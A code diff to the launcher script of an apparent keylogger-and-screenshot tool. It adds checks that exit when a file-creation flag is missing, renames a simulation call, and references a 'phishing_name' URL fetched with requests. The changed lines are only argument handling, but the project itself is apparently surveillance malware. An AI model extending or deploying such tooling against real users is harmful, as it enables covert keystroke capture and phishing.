@@ -86,6 +86,10 @@ try:
 
             if "-sim" in lst:
                 try:
+                    if "-cf" not in lst:
+                        print(gui)
+                        print('YOU HAVE NOT CREATED A FILE. FOR HELP TYPE "python KLS_start.py -help" IN YOUR TERMINAL')
+                        quit()
                     print("The simulation is activated")
                     simulation = "simulater=True"
                     boolean = True
@@ -96,7 +100,7 @@ try:
                         os.chdir("KeyloggerScreenshot")
                         with open(filename, "r+") as file:
                             data = [each for each in file]
-                            data += "\n\nstart_simulation()"
+                            data += "\n\nSimulation.start_simulation()"
                         os.chdir("..")
                         with open(filename, "a+") as this_file:
                             for line in data:
@@ -161,6 +165,10 @@ threading_server4.start() '''
             if "-s" in lst:  # "s" stands for seconds
                 idx_s = lst.index("-s")
                 try:
+                    if "-cf" not in lst:
+                        print(gui)
+                        print('YOU HAVE NOT CREATED A FILE. IF YOU NEED HELP SIMPLY TYPE "python KLS_start.py -help" IN YOUR TERMINAL')
+                        sys.exit()
                     if "-" in lst[idx_s + 1]:
                         print(gui)
                         print("PLEASE SPECIFY YOUR SECONDS -s")
@@ -186,7 +194,7 @@ threading_server4.start() '''
                     if "-cf" not in lst:
                         print(gui)
                         print(
-                            'YOU HAVE NOT SPECIFIED THE FILE. IF YOU NEED HELP SIMPLY TYPE "python KLS_start.py -help" IN YOUR TERMINAL')
+                            'YOU HAVE NOT CREATED A FILE. IF YOU NEED HELP SIMPLY TYPE "python KLS_start.py -help" IN YOUR TERMINAL')
                         sys.exit()
                     try:
                         req = requests.get(phishing_name)
